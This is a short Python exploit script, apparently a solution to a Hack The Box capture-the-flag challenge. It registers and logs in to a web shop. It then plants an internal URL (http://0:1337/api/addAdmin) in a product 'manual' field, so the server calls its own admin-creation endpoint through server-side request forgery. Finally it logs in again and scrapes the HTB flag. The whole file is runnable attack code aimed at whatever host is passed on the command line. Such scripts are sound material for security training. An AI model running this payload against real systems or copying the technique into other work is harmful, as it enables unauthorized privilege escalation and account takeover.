import requests
import re
import sys

if len(sys.argv) != 2:
    print(f"Usage: python3 HauntMsrt ip:port")
    sys.exit(1)

host = sys.argv[1]
url = f"http://{host}"
login_url = f"{url}/api/login"
register_url = f"{url}/api/register"
home_url = f"{url}/home"
ssrf_url = f"{url}/api/product"
logout_url = f"{url}/logout"

session = requests.Session()
data = {"username": "user", "password": "password"}

# Register
r = session.post(register_url, json=data)

# Login
r = session.post(login_url, json=data)


# SSRF exploit
payload = {
    "name": "a",
    "price": "a",
    "description": "a",
    "manual": "http://0:1337/api/addAdmin?username=user"
}
r = session.post(ssrf_url, json=payload)

# Logout
session.get(logout_url)

# Login again to check admin access
r = session.post(login_url, json=data)
if r.status_code == 200:
    res = session.get(home_url)
    print("logged in as admin succ")
    flag = re.search(r'HTB\{.*?\}', res.text)
    if flag:
        print(flag.group())
    else:
        print("Flag not found")
